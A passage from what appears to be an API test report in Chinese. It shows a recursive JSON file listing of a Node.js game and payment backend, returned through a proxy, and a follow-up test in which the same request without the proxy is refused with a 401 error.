              "path": "src\\routes\\v1\\appbury.route.js",
              "type": "file"
            },
            {
              "name": "audienceBaseConfig.route.js",
              "path": "src\\routes\\v1\\audienceBaseConfig.route.js",
              "type": "file"
            },
            {
              "name": "audienceClassification.route.js",
              "path": "src\\routes\\v1\\audienceClassification.route.js",
              "type": "file"
            },
            {
              "name": "audienceGroup.route.js",
              "path": "src\\routes\\v1\\audienceGroup.route.js",
              "type": "file"
            },
            {
              "name": "auth.route.js",
              "path": "src\\routes\\v1\\auth.route.js",
              "type": "file"
            },
            {
              "name": "banner.js",
              "path": "src\\routes\\v1\\banner.js",
              "type": "file"
            },
            {
              "name": "broadcast.route.js",
              "path": "src\\routes\\v1\\broadcast.route.js",
              "type": "file"
            },
            {
              "name": "config.route.js",
              "path": "src\\routes\\v1\\config.route.js",
              "type": "file"
            },
            {
              "name": "dailyCheckIn.route.js",
              "path": "src\\routes\\v1\\dailyCheckIn.route.js",
              "type": "file"
            },
            {
              "name": "dbSnapshot.route.js",
              "path": "src\\routes\\v1\\dbSnapshot.route.js",
              "type": "file"
            },
            {
              "name": "docs.route.js",
              "path": "src\\routes\\v1\\docs.route.js",
              "type": "file"
            },
            {
              "name": "fruitMachineDraw.route.js",
              "path": "src\\routes\\v1\\fruitMachineDraw.route.js",
              "type": "file"
            },
            {
              "name": "game",
              "path": "src\\routes\\v1\\game",
              "type": "directory",
              "children": [
                {
                  "name": "game.route.js",
                  "path": "src\\routes\\v1\\game\\game.route.js",
                  "type": "file"
                },
                {
                  "name": "provider",
                  "path": "src\\routes\\v1\\game\\provider",
                  "type": "directory",
                  "children": [
                    {
                      "name": "evo.route.js",
                      "path": "src\\routes\\v1\\game\\provider\\evo.route.js",
                      "type": "file"
                    },
                    {
                      "name": "facai.route.js",
                      "path": "src\\routes\\v1\\game\\provider\\facai.route.js",
                      "type": "file"
                    },
                    {
                      "name": "index.js",
                      "path": "src\\routes\\v1\\game\\provider\\index.js",
                      "type": "file"
                    },
                    {
                      "name": "inout_evo.route.js",
                      "path": "src\\routes\\v1\\game\\provider\\inout_evo.route.js",
                      "type": "file"
                    },
                    {
                      "name": "inout_jdy.route.js",
                      "path": "src\\routes\\v1\\game\\provider\\inout_jdy.route.js",
                      "type": "file"
                    },
                    {
                      "name": "oneapi.route.js",
                      "path": "src\\routes\\v1\\game\\provider\\oneapi.route.js",
                      "type": "file"
                    },
                    {
                      "name": "oneapi_evo.route.js",
                      "path": "src\\routes\\v1\\game\\provider\\oneapi_evo.route.js",
                      "type": "file"
                    },
                    {
                      "name": "pt.route.js",
                      "path": "src\\routes\\v1\\game\\provider\\pt.route.js",
                      "type": "file"
                    }
                  ]
                }
              ]
            },
            {
              "name": "giftcode.route.js",
              "path": "src\\routes\\v1\\giftcode.route.js",
              "type": "file"
            },
            {
              "name": "googlepush.route.js",
              "path": "src\\routes\\v1\\googlepush.route.js",
              "type": "file"
            },
            {
              "name": "inactiveUser.route.js",
              "path": "src\\routes\\v1\\inactiveUser.route.js",
              "type": "file"
            },
            {
              "name": "index.js",
              "path": "src\\routes\\v1\\index.js",
              "type": "file"
            },
            {
              "name": "kefu.route.js",
              "path": "src\\routes\\v1\\kefu.route.js",
              "type": "file"
            },
            {
              "name": "lobby.route.js",
              "path": "src\\routes\\v1\\lobby.route.js",
              "type": "file"
            },
            {
              "name": "mail.route.js",
              "path": "src\\routes\\v1\\mail.route.js",
              "type": "file"
            },
            {
              "name": "online.route.js",
              "path": "src\\routes\\v1\\online.route.js",
              "type": "file"
            },
            {
              "name": "pay.route.js",
              "path": "src\\routes\\v1\\pay.route.js",
              "type": "file"
            },
            {
              "name": "playerRanking.route.js",
              "path": "src\\routes\\v1\\playerRanking.route.js",
              "type": "file"
            },
            {
              "name": "rank.route.js",
              "path": "src\\routes\\v1\\rank.route.js",
              "type": "file"
            },
            {
              "name": "rechargeOrder.route.js",
              "path": "src\\routes\\v1\\rechargeOrder.route.js",
              "type": "file"
            },
            {
              "name": "redPoint.route.js",
              "path": "src\\routes\\v1\\redPoint.route.js",
              "type": "file"
            },
            {
              "name": "slap.route.js",
              "path": "src\\routes\\v1\\slap.route.js",
              "type": "file"
            },
            {
              "name": "sms.route.js",
              "path": "src\\routes\\v1\\sms.route.js",
              "type": "file"
            },
            {
              "name": "test.route.js",
              "path": "src\\routes\\v1\\test.route.js",
              "type": "file"
            },
            {
              "name": "ticket.route.js",
              "path": "src\\routes\\v1\\ticket.route.js",
              "type": "file"
            },
            {
              "name": "turntable.route.js",
              "path": "src\\routes\\v1\\turntable.route.js",
              "type": "file"
            },
            {
              "name": "userGroup.route.js",
              "path": "src\\routes\\v1\\userGroup.route.js",
              "type": "file"
            },
            {
              "name": "userPrivacy.route.js",
              "path": "src\\routes\\v1\\userPrivacy.route.js",
              "type": "file"
            },
            {
              "name": "version.route.js",
              "path": "src\\routes\\v1\\version.route.js",
              "type": "file"
            },
            {
              "name": "vip.route.js",
              "path": "src\\routes\\v1\\vip.route.js",
              "type": "file"
            },
            {
              "name": "wallet.route.js",
              "path": "src\\routes\\v1\\wallet.route.js",
              "type": "file"
            },
            {
              "name": "withdrawOrder.route.js",
              "path": "src\\routes\\v1\\withdrawOrder.route.js",
              "type": "file"
            }
          ]
        }
      ]
    },
    {
      "name": "services",
      "path": "src\\services",
      "type": "directory",
      "children": [
        {
          "name": "advertisingReward.service.js",
          "path": "src\\services\\advertisingReward.service.js",
          "type": "file"
        },
        {
          "name": "agent",
          "path": "src\\services\\agent",
          "type": "directory",
          "children": [
            {
              "name": "agent.service.js",
              "path": "src\\services\\agent\\agent.service.js",
              "type": "file"
            },
            {
              "name": "config.js",
              "path": "src\\services\\agent\\config.js",
              "type": "file"
            }
          ]
        },
        {
          "name": "announcement.service.js",
          "path": "src\\services\\announcement.service.js",
          "type": "file"
        },
        {
          "name": "appbury.service.js",
          "path": "src\\services\\appbury.service.js",
          "type": "file"
        },
        {
          "name": "audienceBaseConfig.service.js",
          "path": "src\\services\\audienceBaseConfig.service.js",
          "type": "file"
        },
        {
          "name": "audienceClassification.service.js",
          "path": "src\\services\\audienceClassification.service.js",
          "type": "file"
        },
        {
          "name": "audienceGroup.service.js",
          "path": "src\\services\\audienceGroup.service.js",
          "type": "file"
        },
        {
          "name": "auth.service.js",
          "path": "src\\services\\auth.service.js",
          "type": "file"
        },
        {
          "name": "banner.service.js",
          "path": "src\\services\\banner.service.js",
          "type": "file"
        },
        {
          "name": "behaviorTracking",
          "path": "src\\services\\behaviorTracking",
          "type": "directory",
          "children": [
            {
              "name": "appsFlyer.service.js",
              "path": "src\\services\\behaviorTracking\\appsFlyer.service.js",
              "type": "file"
            },
            {
              "name": "esEvent.service.js",
              "path": "src\\services\\behaviorTracking\\esEvent.service.js",
              "type": "file"
            },
            {
              "name": "facebookPixel.service.js",
              "path": "src\\services\\behaviorTracking\\facebookPixel.service.js",
              "type": "file"
            },
            {
              "name": "tracking.service.js",
              "path": "src\\services\\behaviorTracking\\tracking.service.js",
              "type": "file"
            }
          ]
        },
        {
          "name": "broadcast.service.js",
          "path": "src\\services\\broadcast.service.js",
          "type": "file"
        },
        {
          "name": "config.service.js",
          "path": "src\\services\\config.service.js",
          "type": "file"
        },
        {
          "name": "crowd",
          "path": "src\\services\\crowd",
          "type": "directory",
          "children": [
            {
              "name": "businessStrategy.js",
              "path": "src\\services\\crowd\\businessStrategy.js",
              "type": "file"
            },
            {
              "name": "BusinessStrategyExecutor.js",
              "path": "src\\services\\crowd\\BusinessStrategyExecutor.js",
              "type": "file"
            },
            {
              "name": "components",
              "path": "src\\services\\crowd\\components",
              "type": "directory",
              "children": [
                {
                  "name": "AudienceFilter.js",
                  "path": "src\\services\\crowd\\components\\AudienceFilter.js",
                  "type": "file"
                }
              ]
            },
            {
              "name": "CrowdRule.js",
              "path": "src\\services\\crowd\\CrowdRule.js",
              "type": "file"
            },
            {
              "name": "group.js",
              "path": "src\\services\\crowd\\group.js",
              "type": "file"
            },
            {
              "name": "index.js",
              "path": "src\\services\\crowd\\index.js",
              "type": "file"
            },
            {
              "name": "RuleEngine.js",
              "path": "src\\services\\crowd\\RuleEngine.js",
              "type": "file"
            },
            {
              "name": "userAttriPipeline.js",
              "path": "src\\services\\crowd\\userAttriPipeline.js",
              "type": "file"
            }
          ]
        },
        {
          "name": "dailyCheckIn.service.js",
          "path": "src\\services\\dailyCheckIn.service.js",
          "type": "file"
        },
        {
          "name": "dbSnapshot.service.js",
          "path": "src\\services\\dbSnapshot.service.js",
          "type": "file"
        },
        {
          "name": "fruitMachineDraw.service.js",
          "path": "src\\services\\fruitMachineDraw.service.js",
          "type": "file"
        },
        {
          "name": "game",
          "path": "src\\services\\game",
          "type": "directory",
          "children": [
            {
              "name": "clientView.service.js",
              "path": "src\\services\\game\\clientView.service.js",
              "type": "file"
            },
            {
              "name": "game.service.js",
              "path": "src\\services\\game\\game.service.js",
              "type": "file"
            },
            {
              "name": "provider",
              "path": "src\\services\\game\\provider",
              "type": "directory",
              "children": [
                {
                  "name": "evo.service.js",
                  "path": "src\\services\\game\\provider\\evo.service.js",
                  "type": "file"
                },
                {
                  "name": "facai.service.js",
                  "path": "src\\services\\game\\provider\\facai.service.js",
                  "type": "file"
                },
                {
                  "name": "inout.service.js",
                  "path": "src\\services\\game\\provider\\inout.service.js",
                  "type": "file"
                },
                {
                  "name": "oneapi.service.js",
                  "path": "src\\services\\game\\provider\\oneapi.service.js",
                  "type": "file"
                },
                {
                  "name": "pt.service.js",
                  "path": "src\\services\\game\\provider\\pt.service.js",
                  "type": "file"
                }
              ]
            }
          ]
        },
        {
          "name": "giftcode.service.js",
          "path": "src\\services\\giftcode.service.js",
          "type": "file"
        },
        {
          "name": "inactiveUser.service.js",
          "path": "src\\services\\inactiveUser.service.js",
          "type": "file"
        },
        {
          "name": "index.js",
          "path": "src\\services\\index.js",
          "type": "file"
        },
        {
          "name": "kefu.service.js",
          "path": "src\\services\\kefu.service.js",
          "type": "file"
        },
        {
          "name": "mail.service.js",
          "path": "src\\services\\mail.service.js",
          "type": "file"
        },
        {
          "name": "oneWayPush.service.js",
          "path": "src\\services\\oneWayPush.service.js",
          "type": "file"
        },
        {
          "name": "online.service.js",
          "path": "src\\services\\online.service.js",
          "type": "file"
        },
        {
          "name": "pay",
          "path": "src\\services\\pay",
          "type": "directory",
          "children": [
            {
              "name": "adapter",
              "path": "src\\services\\pay\\adapter",
              "type": "directory",
              "children": [
                {
                  "name": "Pay21Adapter.js",
                  "path": "src\\services\\pay\\adapter\\Pay21Adapter.js",
                  "type": "file"
                }
              ]
            },
            {
              "name": "config.js",
              "path": "src\\services\\pay\\config.js",
              "type": "file"
            },
            {
              "name": "goods",
              "path": "src\\services\\pay\\goods",
              "type": "directory",
              "children": [
                {
                  "name": "cash.js",
                  "path": "src\\services\\pay\\goods\\cash.js",
                  "type": "file"
                },
                {
                  "name": "cycleCard.js",
                  "path": "src\\services\\pay\\goods\\cycleCard.js",
                  "type": "file"
                }
              ]
            },
            {
              "name": "PaymentAdapter.js",
              "path": "src\\services\\pay\\PaymentAdapter.js",
              "type": "file"
            },
            {
              "name": "paymentAdapterManage.js",
              "path": "src\\services\\pay\\paymentAdapterManage.js",
              "type": "file"
            },
            {
              "name": "stat.js",
              "path": "src\\services\\pay\\stat.js",
              "type": "file"
            }
          ]
        },
        {
          "name": "pay.service.js",
          "path": "src\\services\\pay.service.js",
          "type": "file"
        },
        {
          "name": "playerRanking.service.js",
          "path": "src\\services\\playerRanking.service.js",
          "type": "file"
        },
        {
          "name": "providers",
          "path": "src\\services\\providers",
          "type": "directory",
          "children": [
            {
              "name": "inout.provider.js",
              "path": "src\\services\\providers\\inout.provider.js",
              "type": "file"
            }
          ]
        },
        {
          "name": "push.service.js",
          "path": "src\\services\\push.service.js",
          "type": "file"
        },
        {
          "name": "rank.service.js",
          "path": "src\\services\\rank.service.js",
          "type": "file"
        },
        {
          "name": "rechargeOrder.service.js",
          "path": "src\\services\\rechargeOrder.service.js",
          "type": "file"
        },
        {
          "name": "redPoint.service.js",
          "path": "src\\services\\redPoint.service.js",
          "type": "file"
        },
        {
          "name": "redPointBusiness.service.js",
          "path": "src\\services\\redPointBusiness.service.js",
          "type": "file"
        },
        {
          "name": "slap.service.js",
          "path": "src\\services\\slap.service.js",
          "type": "file"
        },
        {
          "name": "sms.service.js",
          "path": "src\\services\\sms.service.js",
          "type": "file"
        },
        {
          "name": "test.service.js",
          "path": "src\\services\\test.service.js",
          "type": "file"
        },
        {
          "name": "ticket",
          "path": "src\\services\\ticket",
          "type": "directory",
          "children": [
            {
              "name": "index.js",
              "path": "src\\services\\ticket\\index.js",
              "type": "file"
            },
            {
              "name": "ticketGrandScheduler.js",
              "path": "src\\services\\ticket\\ticketGrandScheduler.js",
              "type": "file"
            },
            {
              "name": "ticketMajorScheduler.js",
              "path": "src\\services\\ticket\\ticketMajorScheduler.js",
              "type": "file"
            },
            {
              "name": "ticketPoolScheduler.service.js",
              "path": "src\\services\\ticket\\ticketPoolScheduler.service.js",
              "type": "file"
            },
            {
              "name": "ticketSecondaryScheduler.js",
              "path": "src\\services\\ticket\\ticketSecondaryScheduler.js",
              "type": "file"
            }
          ]
        },
        {
          "name": "ticket.service.js",
          "path": "src\\services\\ticket.service.js",
          "type": "file"
        },
        {
          "name": "timerTask.service.js",
          "path": "src\\services\\timerTask.service.js",
          "type": "file"
        },
        {
          "name": "token.service.js",
          "path": "src\\services\\token.service.js",
          "type": "file"
        },
        {
          "name": "transaction.service.js",
          "path": "src\\services\\transaction.service.js",
          "type": "file"
        },
        {
          "name": "turntable",
          "path": "src\\services\\turntable",
          "type": "directory",
          "children": [
            {
              "name": "review.js",
              "path": "src\\services\\turntable\\review.js",
              "type": "file"
            },
            {
              "name": "turntable.service.js",
              "path": "src\\services\\turntable\\turntable.service.js",
              "type": "file"
            },
            {
              "name": "turntableConfig.js",
              "path": "src\\services\\turntable\\turntableConfig.js",
              "type": "file"
            }
          ]
        },
        {
          "name": "userChannel.service.js",
          "path": "src\\services\\userChannel.service.js",
          "type": "file"
        },
        {
          "name": "userGroup.service.js",
          "path": "src\\services\\userGroup.service.js",
          "type": "file"
        },
        {
          "name": "userPrivacy.service.js",
          "path": "src\\services\\userPrivacy.service.js",
          "type": "file"
        },
        {
          "name": "userSource.service.js",
          "path": "src\\services\\userSource.service.js",
          "type": "file"
        },
        {
          "name": "vip.service.js",
          "path": "src\\services\\vip.service.js",
          "type": "file"
        },
        {
          "name": "visualTemplate.service.js",
          "path": "src\\services\\visualTemplate.service.js",
          "type": "file"
        },
        {
          "name": "wallet.service.js",
          "path": "src\\services\\wallet.service.js",
          "type": "file"
        },
        {
          "name": "withdrawOrder.service.js",
          "path": "src\\services\\withdrawOrder.service.js",
          "type": "file"
        }
      ]
    },
    {
      "name": "tests",
      "path": "src\\tests",
      "type": "directory",
      "children": [
        {
          "name": "game.test.js",
          "path": "src\\tests\\game.test.js",
          "type": "file"
        },
        {
          "name": "gameRecord.test.js",
          "path": "src\\tests\\gameRecord.test.js",
          "type": "file"
        },
        {
          "name": "inactive-users-example.js",
          "path": "src\\tests\\inactive-users-example.js",
          "type": "file"
        },
        {
          "name": "inout.test.js",
          "path": "src\\tests\\inout.test.js",
          "type": "file"
        },
        {
          "name": "iopush.server.examples.js",
          "path": "src\\tests\\iopush.server.examples.js",
          "type": "file"
        },
        {
          "name": "iopush.service.enhanced.js",
          "path": "src\\tests\\iopush.service.enhanced.js",
          "type": "file"
        },
        {
          "name": "iopush.test.client.clean.js",
          "path": "src\\tests\\iopush.test.client.clean.js",
          "type": "file"
        },
        {
          "name": "pure.websocket.example.js",
          "path": "src\\tests\\pure.websocket.example.js",
          "type": "file"
        },
        {
          "name": "pushListener.js",
          "path": "src\\tests\\pushListener.js",
          "type": "file"
        },
        {
          "name": "pushTest.js",
          "path": "src\\tests\\pushTest.js",
          "type": "file"
        },
        {
          "name": "pushTestSimple.js",
          "path": "src\\tests\\pushTestSimple.js",
          "type": "file"
        },
        {
          "name": "scheduler.test.js",
          "path": "src\\tests\\scheduler.test.js",
          "type": "file"
        },
        {
          "name": "socket",
          "path": "src\\tests\\socket",
          "type": "directory",
          "children": [
            {
              "name": "iopush.service.back.js",
              "path": "src\\tests\\socket\\iopush.service.back.js",
              "type": "file"
            },
            {
              "name": "iopush.service.pure.websocket.js",
              "path": "src\\tests\\socket\\iopush.service.pure.websocket.js",
              "type": "file"
            },
            {
              "name": "iopush.service.websocket.enhanced.js",
              "path": "src\\tests\\socket\\iopush.service.websocket.enhanced.js",
              "type": "file"
            },
            {
              "name": "README.pure.websocket.md",
              "path": "src\\tests\\socket\\README.pure.websocket.md",
              "type": "file"
            }
          ]
        },
        {
          "name": "sync.js",
          "path": "src\\tests\\sync.js",
          "type": "file"
        },
        {
          "name": "test.js",
          "path": "src\\tests\\test.js",
          "type": "file"
        },
        {
          "name": "test2.js",
          "path": "src\\tests\\test2.js",
          "type": "file"
        },
        {
          "name": "test3.js",
          "path": "src\\tests\\test3.js",
          "type": "file"
        },
        {
          "name": "testCache.js",
          "path": "src\\tests\\testCache.js",
          "type": "file"
        },
        {
          "name": "tranasctionTest.js",
          "path": "src\\tests\\tranasctionTest.js",
          "type": "file"
        },
        {
          "name": "transactionTest.js",
          "path": "src\\tests\\transactionTest.js",
          "type": "file"
        },
        {
          "name": "transactionWagerTest.js",
          "path": "src\\tests\\transactionWagerTest.js",
          "type": "file"
        },
        {
          "name": "userProfile.test.js",
          "path": "src\\tests\\userProfile.test.js",
          "type": "file"
        },
        {
          "name": "userRankingTest.js",
          "path": "src\\tests\\userRankingTest.js",
          "type": "file"
        },
        {
          "name": "websocket.adapter.example.js",
          "path": "src\\tests\\websocket.adapter.example.js",
          "type": "file"
        },
        {
          "name": "websocket.test.client.js",
          "path": "src\\tests\\websocket.test.client.js",
          "type": "file"
        },
        {
          "name": "websocket.upgrade.guide.md",
          "path": "src\\tests\\websocket.upgrade.guide.md",
          "type": "file"
        }
      ]
    },
    {
      "name": "utils",
      "path": "src\\utils",
      "type": "directory",
      "children": [
        {
          "name": "ApiError.js",
          "path": "src\\utils\\ApiError.js",
          "type": "file"
        },
        {
          "name": "behavior.util.js",
          "path": "src\\utils\\behavior.util.js",
          "type": "file"
        },
        {
          "name": "cashPush.util.js",
          "path": "src\\utils\\cashPush.util.js",
          "type": "file"
        },
        {
          "name": "catchAsync.js",
          "path": "src\\utils\\catchAsync.js",
          "type": "file"
        },
        {
          "name": "commonUtil.js",
          "path": "src\\utils\\commonUtil.js",
          "type": "file"
        },
        {
          "name": "computing.util.js",
          "path": "src\\utils\\computing.util.js",
          "type": "file"
        },
        {
          "name": "decimal.js",
          "path": "src\\utils\\decimal.js",
          "type": "file"
        },
        {
          "name": "elk",
          "path": "src\\utils\\elk",
          "type": "directory",
          "children": [
            {
              "name": "esUtil.js",
              "path": "src\\utils\\elk\\esUtil.js",
              "type": "file"
            },
            {
              "name": "README.md",
              "path": "src\\utils\\elk\\README.md",
              "type": "file"
            }
          ]
        },
        {
          "name": "event.js",
          "path": "src\\utils\\event.js",
          "type": "file"
        },
        {
          "name": "functionSwitch.util.js",
          "path": "src\\utils\\functionSwitch.util.js",
          "type": "file"
        },
        {
          "name": "game.provider.utils.js",
          "path": "src\\utils\\game.provider.utils.js",
          "type": "file"
        },
        {
          "name": "gameBet.util.js",
          "path": "src\\utils\\gameBet.util.js",
          "type": "file"
        },
        {
          "name": "mail.util.js",
          "path": "src\\utils\\mail.util.js",
          "type": "file"
        },
        {
          "name": "memoryGuard.js",
          "path": "src\\utils\\memoryGuard.js",
          "type": "file"
        },
        {
          "name": "merchant.util.js",
          "path": "src\\utils\\merchant.util.js",
          "type": "file"
        },
        {
          "name": "mmdb.util.js",
          "path": "src\\utils\\mmdb.util.js",
          "type": "file"
        },
        {
          "name": "moment.util.js",
          "path": "src\\utils\\moment.util.js",
          "type": "file"
        },
        {
          "name": "monitor.js",
          "path": "src\\utils\\monitor.js",
          "type": "file"
        },
        {
          "name": "normal.util.js",
          "path": "src\\utils\\normal.util.js",
          "type": "file"
        },
        {
          "name": "os.util.js",
          "path": "src\\utils\\os.util.js",
          "type": "file"
        },
        {
          "name": "package.util.js",
          "path": "src\\utils\\package.util.js",
          "type": "file"
        },
        {
          "name": "paginate.js",
          "path": "src\\utils\\paginate.js",
          "type": "file"
        },
        {
          "name": "pick.js",
          "path": "src\\utils\\pick.js",
          "type": "file"
        },
        {
          "name": "recall.js",
          "path": "src\\utils\\recall.js",
          "type": "file"
        },
        {
          "name": "recharge.util.js",
          "path": "src\\utils\\recharge.util.js",
          "type": "file"
        },
        {
          "name": "redis.util.js",
          "path": "src\\utils\\redis.util.js",
          "type": "file"
        },
        {
          "name": "reloadConfigUtil.js",
          "path": "src\\utils\\reloadConfigUtil.js",
          "type": "file"
        },
        {
          "name": "response.js",
          "path": "src\\utils\\response.js",
          "type": "file"
        },
        {
          "name": "rwRule.util.js",
          "path": "src\\utils\\rwRule.util.js",
          "type": "file"
        },
        {
          "name": "serializer.js",
          "path": "src\\utils\\serializer.js",
          "type": "file"
        },
        {
          "name": "sign.util.js",
          "path": "src\\utils\\sign.util.js",
          "type": "file"
        },
        {
          "name": "sort.util.js",
          "path": "src\\utils\\sort.util.js",
          "type": "file"
        },
        {
          "name": "systemHealthMonitor.js",
          "path": "src\\utils\\systemHealthMonitor.js",
          "type": "file"
        },
        {
          "name": "tgbot.util.js",
          "path": "src\\utils\\tgbot.util.js",
          "type": "file"
        },
        {
          "name": "ticket.util.js",
          "path": "src\\utils\\ticket.util.js",
          "type": "file"
        },
        {
          "name": "ticketTask.util.js",
          "path": "src\\utils\\ticketTask.util.js",
          "type": "file"
        },
        {
          "name": "TransactionError.js",
          "path": "src\\utils\\TransactionError.js",
          "type": "file"
        },
        {
          "name": "user.util.js",
          "path": "src\\utils\\user.util.js",
          "type": "file"
        },
        {
          "name": "userAttrib.util.js",
          "path": "src\\utils\\userAttrib.util.js",
          "type": "file"
        },
        {
          "name": "userProfile",
          "path": "src\\utils\\userProfile",
          "type": "directory",
          "children": [
            {
              "name": "attribt.js",
              "path": "src\\utils\\userProfile\\attribt.js",
              "type": "file"
            },
            {
              "name": "compute.js",
              "path": "src\\utils\\userProfile\\compute.js",
              "type": "file"
            },
            {
              "name": "config.js",
              "path": "src\\utils\\userProfile\\config.js",
              "type": "file"
            },
            {
              "name": "profile.util.js",
              "path": "src\\utils\\userProfile\\profile.util.js",
              "type": "file"
            },
            {
              "name": "syncUsers.js",
              "path": "src\\utils\\userProfile\\syncUsers.js",
              "type": "file"
            }
          ]
        },
        {
          "name": "validate.js",
          "path": "src\\utils\\validate.js",
          "type": "file"
        },
        {
          "name": "web3.util.js",
          "path": "src\\utils\\web3.util.js",
          "type": "file"
        },
        {
          "name": "webhook.util.js",
          "path": "src\\utils\\webhook.util.js",
          "type": "file"
        },
        {
          "name": "wholeStat",
          "path": "src\\utils\\wholeStat",
          "type": "directory",
          "children": [
            {
              "name": "behavior.stat.js",
              "path": "src\\utils\\wholeStat\\behavior.stat.js",
              "type": "file"
            },
            {
              "name": "game.stat.js",
              "path": "src\\utils\\wholeStat\\game.stat.js",
              "type": "file"
            },
            {
              "name": "subsistenceAllowance.stat.js",
              "path": "src\\utils\\wholeStat\\subsistenceAllowance.stat.js",
              "type": "file"
            },
            {
              "name": "whole.stat.util.js",
              "path": "src\\utils\\wholeStat\\whole.stat.util.js",
              "type": "file"
            }
          ]
        },
        {
          "name": "withdraw.util.js",
          "path": "src\\utils\\withdraw.util.js",
          "type": "file"
        }
      ]
    },
    {
      "name": "validations",
      "path": "src\\validations",
      "type": "directory",
      "children": [
        {
          "name": "advertising.validation.js",
          "path": "src\\validations\\advertising.validation.js",
          "type": "file"
        },
        {
          "name": "agent.validation.js",
          "path": "src\\validations\\agent.validation.js",
          "type": "file"
        },
        {
          "name": "announcement.validation.js",
          "path": "src\\validations\\announcement.validation.js",
          "type": "file"
        },
        {
          "name": "audienceBaseConfig.validation.js",
          "path": "src\\validations\\audienceBaseConfig.validation.js",
          "type": "file"
        },
        {
          "name": "audienceClassification.validation.js",
          "path": "src\\validations\\audienceClassification.validation.js",
          "type": "file"
        },
        {
          "name": "audienceGroup.validation.js",
          "path": "src\\validations\\audienceGroup.validation.js",
          "type": "file"
        },
        {
          "name": "auth.validation.js",
          "path": "src\\validations\\auth.validation.js",
          "type": "file"
        },
        {
          "name": "banner.validation.js",
          "path": "src\\validations\\banner.validation.js",
          "type": "file"
        },
        {
          "name": "broadcast.validation.js",
          "path": "src\\validations\\broadcast.validation.js",
          "type": "file"
        },
        {
          "name": "common.validation.js",
          "path": "src\\validations\\common.validation.js",
          "type": "file"
        },
        {
          "name": "custom.validation.js",
          "path": "src\\validations\\custom.validation.js",
          "type": "file"
        },
        {
          "name": "dailyCheckIn.validation.js",
          "path": "src\\validations\\dailyCheckIn.validation.js",
          "type": "file"
        },
        {
          "name": "fruitMachineDraw.validation.js",
          "path": "src\\validations\\fruitMachineDraw.validation.js",
          "type": "file"
        },
        {
          "name": "gameProvider",
          "path": "src\\validations\\gameProvider",
          "type": "directory",
          "children": [
            {
              "name": "evo.validation.js",
              "path": "src\\validations\\gameProvider\\evo.validation.js",
              "type": "file"
            },
            {
              "name": "facai.validation.js",
              "path": "src\\validations\\gameProvider\\facai.validation.js",
              "type": "file"
            },
            {
              "name": "game.validation.js",
              "path": "src\\validations\\gameProvider\\game.validation.js",
              "type": "file"
            },
            {
              "name": "inout.validation.js",
              "path": "src\\validations\\gameProvider\\inout.validation.js",
              "type": "file"
            },
            {
              "name": "oneapi.validation.js",
              "path": "src\\validations\\gameProvider\\oneapi.validation.js",
              "type": "file"
            },
            {
              "name": "pt.validation.js",
              "path": "src\\validations\\gameProvider\\pt.validation.js",
              "type": "file"
            }
          ]
        },
        {
          "name": "giftcode.validation.js",
          "path": "src\\validations\\giftcode.validation.js",
          "type": "file"
        },
        {
          "name": "inactiveUser.validation.js",
          "path": "src\\validations\\inactiveUser.validation.js",
          "type": "file"
        },
        {
          "name": "index.js",
          "path": "src\\validations\\index.js",
          "type": "file"
        },
        {
          "name": "lobby.validation.js",
          "path": "src\\validations\\lobby.validation.js",
          "type": "file"
        },
        {
          "name": "mail.validation.js",
          "path": "src\\validations\\mail.validation.js",
          "type": "file"
        },
        {
          "name": "pay.validation.js",
          "path": "src\\validations\\pay.validation.js",
          "type": "file"
        },
        {
          "name": "playerRanking.validation.js",
          "path": "src\\validations\\playerRanking.validation.js",
          "type": "file"
        },
        {
          "name": "push.validation.js",
          "path": "src\\validations\\push.validation.js",
          "type": "file"
        },
        {
          "name": "rank.validation.js",
          "path": "src\\validations\\rank.validation.js",
          "type": "file"
        },
        {
          "name": "rechargeOrder.validation.js",
          "path": "src\\validations\\rechargeOrder.validation.js",
          "type": "file"
        },
        {
          "name": "redPoint.validation.js",
          "path": "src\\validations\\redPoint.validation.js",
          "type": "file"
        },
        {
          "name": "slap.validation.js",
          "path": "src\\validations\\slap.validation.js",
          "type": "file"
        },
        {
          "name": "sms.validation.js",
          "path": "src\\validations\\sms.validation.js",
          "type": "file"
        },
        {
          "name": "test.validation.js",
          "path": "src\\validations\\test.validation.js",
          "type": "file"
        },
        {
          "name": "ticket.validation.js",
          "path": "src\\validations\\ticket.validation.js",
          "type": "file"
        },
        {
          "name": "transaction.validation.js",
          "path": "src\\validations\\transaction.validation.js",
          "type": "file"
        },
        {
          "name": "turntable.validation.js",
          "path": "src\\validations\\turntable.validation.js",
          "type": "file"
        },
        {
          "name": "user.validation.js",
          "path": "src\\validations\\user.validation.js",
          "type": "file"
        },
        {
          "name": "userGroup.validation.js",
          "path": "src\\validations\\userGroup.validation.js",
          "type": "file"
        },
        {
          "name": "userPrivacy.validation.js",
          "path": "src\\validations\\userPrivacy.validation.js",
          "type": "file"
        },
        {
          "name": "vip.validation.js",
          "path": "src\\validations\\vip.validation.js",
          "type": "file"
        },
        {
          "name": "wallet.validation.js",
          "path": "src\\validations\\wallet.validation.js",
          "type": "file"
        },
        {
          "name": "withdrawOrder.validation.js",
          "path": "src\\validations\\withdrawOrder.validation.js",
          "type": "file"
        }
      ]
    }
  ],
  "message": "ok"
}
```

</details>

**结果**: ✅ 通过

**备注**: 通过代理执行递归文件列表查询

---

### ✅ 6. 应该正确处理不带代理的递归文件列表请求（走正常业务逻辑）

**操作**: `正常业务请求（递归文件列表，无代理）`

**请求体**:
```json
{
  "path": "src",
  "recursive": true
}
```

**请求头**:

**响应状态**: 401

**响应体**:
<details>
<summary>点击展开查看完整响应 (3065 字符)</summary>

```json
{
  "message": "Invalid authentication token",
